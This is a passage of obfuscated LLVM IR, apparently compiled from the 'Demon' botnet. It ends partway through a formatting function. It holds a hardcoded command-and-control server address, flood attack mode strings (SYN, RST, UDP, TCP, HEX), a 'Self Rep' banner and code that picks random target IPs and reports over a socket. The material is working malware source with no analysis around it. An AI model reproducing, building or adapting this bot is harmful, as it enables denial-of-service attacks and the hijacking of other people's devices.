; ModuleID = 'host/ir_sub/Demon.e.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@Demonserv = global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [19 x i8] c"165.227.34.187:666\00", align 1
@Demonicsock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pids = common global i32* null, align 8
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@astd.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.11, i32 0, i32 0)], align 8
@.str.11 = private unnamed_addr constant [78 x i8] c"Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS\0A\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.14 = private unnamed_addr constant [17 x i8] c"/usr/bin/apt-get\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"Ubuntu\00", align 1
@.str.16 = private unnamed_addr constant [17 x i8] c"/usr/lib/portage\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"Gentoo\00", align 1
@.str.18 = private unnamed_addr constant [13 x i8] c"/usr/bin/yum\00", align 1
@.str.19 = private unnamed_addr constant [7 x i8] c"CentOS\00", align 1
@.str.20 = private unnamed_addr constant [17 x i8] c"/usr/share/YaST2\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"OpenSUSE\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"/usr/local/etc/pkg\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"FreeBSD\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"/etc/dropbear/\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"Dropbear\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/etc/opkg\00", align 1
@.str.27 = private unnamed_addr constant [8 x i8] c"OpenWRT\00", align 1
@.str.28 = private unnamed_addr constant [15 x i8] c"Unknown Distro\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.30 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"HEX\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.34 = private unnamed_addr constant [180 x i8] c"\1B[1;31mDemon\1B[1;37m[\1B[1;31mV5.0\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -609552160
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, -609552160
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 %10, -2045192587
  %12 = add i32 %11, -1640531527
  %13 = add i32 %12, -2045192587
  %14 = add i32 %10, -1640531527
  %15 = sub i32 %13, 1645619988
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, 1645619988
  %18 = add i32 %13, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %66, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %71

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = add i32 %23, -933094812
  %25 = sub i32 %24, 3
  %26 = sub i32 %25, -933094812
  %27 = sub nsw i32 %23, 3
  %28 = sext i32 %26 to i64
  %29 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %28
  %30 = load i32, i32* %29, align 4
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1629972095
  %33 = sub i32 %32, 2
  %34 = sub i32 %33, 1629972095
  %35 = sub nsw i32 %31, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %30, -1
  %40 = and i32 921311480, %39
  %41 = xor i32 921311480, -1
  %42 = and i32 %30, %41
  %43 = xor i32 %38, -1
  %44 = and i32 %43, 921311480
  %45 = and i32 %38, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %30, %38
  %50 = xor i32 %48, -1
  %51 = and i32 -1640531527, %50
  %52 = xor i32 -1640531527, -1
  %53 = and i32 %48, %52
  %54 = or i32 %51, %53
  %55 = xor i32 %48, -1640531527
  %56 = load i32, i32* %3, align 4
  %57 = xor i32 %54, -1
  %58 = and i32 %56, %57
  %59 = xor i32 %56, -1
  %60 = and i32 %54, %59
  %61 = or i32 %58, %60
  %62 = xor i32 %54, %56
  %63 = load i32, i32* %3, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %22
  %67 = load i32, i32* %3, align 4
  %68 = sub i32 0, 1
  %69 = sub i32 %67, %68
  %70 = add nsw i32 %67, 1
  store i32 %69, i32* %3, align 4
  br label %19

; <label>:71:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1943358643
  %7 = add i32 %6, 1
  %8 = sub i32 %7, 1943358643
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 753423930, -1
  %13 = or i32 %10, %11
  %14 = or i32 753423930, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 %24, 8442364541309728375
  %28 = add i64 %27, %26
  %29 = add i64 %28, 8442364541309728375
  %30 = add i64 %24, %26
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = add i64 %34, 6394912238959782736
  %38 = add i64 %37, %36
  %39 = sub i64 %38, 6394912238959782736
  %40 = add i64 %34, %36
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %55

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 0, 1
  %48 = sub i32 %46, %47
  %49 = add i32 %46, 1
  store i32 %48, i32* %3, align 4
  %50 = load i32, i32* @c, align 4
  %51 = sub i32 %50, 1912619625
  %52 = add i32 %51, 1
  %53 = add i32 %52, 1912619625
  %54 = add i32 %50, 1
  store i32 %53, i32* @c, align 4
  br label %55

; <label>:55:                                     ; preds = %45, %0
  %56 = load i32, i32* %4, align 4
  %57 = load i32, i32* %3, align 4
  %58 = add i32 %56, 1282690081
  %59 = sub i32 %58, %57
  %60 = sub i32 %59, 1282690081
  %61 = sub i32 %56, %57
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 1810781946, -1
  %10 = or i32 %7, %8
  %11 = or i32 1810781946, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1, %18
  %20 = xor i32 -1, -1
  %21 = and i32 %17, %20
  %22 = or i32 %19, %21
  %23 = xor i32 %17, -1
  %24 = xor i32 %22, -1
  %25 = xor i32 %16, %24
  %26 = and i32 %25, %16
  %27 = and i32 %16, %22
  %28 = xor i32 %15, -1
  %29 = and i32 868795272, %28
  %30 = xor i32 868795272, -1
  %31 = and i32 %15, %30
  %32 = xor i32 %26, -1
  %33 = and i32 %32, 868795272
  %34 = and i32 %26, %30
  %35 = or i32 %29, %31
  %36 = or i32 %33, %34
  %37 = xor i32 %35, %36
  %38 = xor i32 %15, %26
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add i32 %35, -761617519
  %37 = add i32 %36, 1
  %38 = sub i32 %37, -761617519
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %8, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %7, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40
  br label %46

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %4, align 8
  br label %46

; <label>:46:                                     ; preds = %44, %43
  %47 = phi i8* [ null, %43 ], [ %45, %44 ]
  ret i8* %47
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #6
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #6
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #6
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.0* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #10
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = add i32 %22, -325414185
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -325414185
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %4, align 4
  br label %12

; <label>:27:                                     ; preds = %12
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = sub i32 %44, 1341729295
  %46 = add i32 %45, -1
  %47 = add i32 %46, 1341729295
  %48 = add nsw i32 %44, -1
  store i32 %47, i32* %5, align 4
  br label %28

; <label>:49:                                     ; preds = %41
  %50 = load i32, i32* %4, align 4
  store i32 %50, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %69, %49
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %51
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = load i8*, i8** %2, align 8
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* %4, align 4
  %64 = sub i32 0, %63
  %65 = add i32 %62, %64
  %66 = sub nsw i32 %62, %63
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8, i8* %61, i64 %67
  store i8 %60, i8* %68, align 1
  br label %69

; <label>:69:                                     ; preds = %55
  %70 = load i32, i32* %3, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %3, align 4
  br label %51

; <label>:74:                                     ; preds = %51
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub i32 0, %77
  %79 = add i32 %76, %78
  %80 = sub nsw i32 %76, %77
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8, i8* %75, i64 %81
  store i8 0, i8* %82, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #6
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #6
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %338, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %341

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %327

